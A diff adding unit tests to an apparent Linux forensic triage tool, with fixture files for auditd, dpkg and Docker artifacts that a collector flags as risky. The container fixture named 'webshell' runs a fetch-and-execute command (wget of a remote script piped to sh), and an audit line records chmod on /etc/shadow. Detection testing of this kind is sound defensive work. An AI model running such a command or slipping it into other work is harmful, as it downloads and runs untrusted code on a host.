@@ -32,6 +32,10 @@ class RapidTriageLinuxArtifactsTests(unittest.TestCase):
             self.assertIn("linux-ssh-authorized-key", artifact_types)
             self.assertIn("linux-ssh-known-host", artifact_types)
             self.assertIn("linux-auth-log-event", artifact_types)
+            self.assertIn("linux-auditd-event", artifact_types)
+            self.assertIn("linux-package", artifact_types)
+            self.assertIn("linux-package-event", artifact_types)
+            self.assertIn("linux-container-config", artifact_types)
             self.assertIn("linux-cron-entry", artifact_types)
             self.assertIn("linux-systemd-service", artifact_types)
 
@@ -63,6 +67,24 @@ class RapidTriageLinuxArtifactsTests(unittest.TestCase):
             self.assertEqual(service["details"]["unit_name"], "evil.service")
             self.assertIn("runs-as-root", service["details"]["risk_flags"])
             self.assertIn("user-writable-exec-path", service["details"]["risk_flags"])
+
+            auditd = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-auditd-event")
+            self.assertEqual(auditd["details"]["event_type"], "SYSCALL")
+            self.assertEqual(auditd["details"]["comm"], "chmod")
+            self.assertIn("sensitive-file-access", auditd["details"]["risk_flags"])
+
+            package = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-package")
+            self.assertEqual(package["details"]["package"], "curl")
+            self.assertEqual(package["details"]["version"], "7.88.1-10")
+
+            package_event = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-package-event")
+            self.assertEqual(package_event["details"]["action"], "install")
+            self.assertEqual(package_event["details"]["package"], "curl")
+
+            container = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-container-config")
+            self.assertEqual(container["details"]["name"], "webshell")
+            self.assertEqual(container["details"]["image"], "alpine:latest")
+            self.assertIn("latest-image-tag", container["details"]["risk_flags"])
 
     def test_linux_system_collector_is_wired_into_run_outputs(self) -> None:
         with tempfile.TemporaryDirectory() as tmp_dir:
@@ -108,6 +130,9 @@ def build_linux_fixture(root: Path) -> None:
     (root / "etc" / "systemd" / "system").mkdir(parents=True, exist_ok=True)
     (root / "etc" / "cron.d").mkdir(parents=True, exist_ok=True)
     (root / "var" / "log").mkdir(parents=True, exist_ok=True)
+    (root / "var" / "log" / "audit").mkdir(parents=True, exist_ok=True)
+    (root / "var" / "lib" / "dpkg").mkdir(parents=True, exist_ok=True)
+    (root / "var" / "lib" / "docker" / "containers" / "abcdef").mkdir(parents=True, exist_ok=True)
     alice = root / "home" / "alice"
     (alice / ".ssh").mkdir(parents=True, exist_ok=True)
 
@@ -143,6 +168,35 @@ def build_linux_fixture(root: Path) -> None:
             ]
         )
         + "\n",
+        encoding="utf-8",
+    )
+    (root / "var" / "log" / "audit" / "audit.log").write_text(
+        'type=SYSCALL msg=audit(1714219200.123:77): arch=c000003e syscall=90 success=yes uid=0 auid=1000 comm="chmod" exe="/usr/bin/chmod" name="/etc/shadow" key="perm-change"\n',
+        encoding="utf-8",
+    )
+    (root / "var" / "lib" / "dpkg" / "status").write_text(
+        "Package: curl\n"
+        "Status: install ok installed\n"
+        "Architecture: amd64\n"
+        "Version: 7.88.1-10\n"
+        "Maintainer: Debian Curl Maintainers\n"
+        "Description: command line tool for transferring data\n\n",
+        encoding="utf-8",
+    )
+    (root / "var" / "log" / "dpkg.log").write_text(
+        "2024-04-27 12:00:00 install curl:amd64 <none> 7.88.1-10\n",
+        encoding="utf-8",
+    )
+    (root / "var" / "lib" / "docker" / "containers" / "abcdef" / "config.v2.json").write_text(
+        json.dumps(
+            {
+                "ID": "abcdef",
+                "Name": "/webshell",
+                "Created": "2024-04-27T12:00:00Z",
+                "LogPath": "/var/lib/docker/containers/abcdef/abcdef-json.log",
+                "Config": {"Image": "alpine:latest", "Cmd": ["sh", "-c", "wget http://203.0.113.99/p.sh -O- | sh"]},
+            }
+        ),
         encoding="utf-8",
     )
     (root / "etc" / "cron.d" / "backup").write_text(
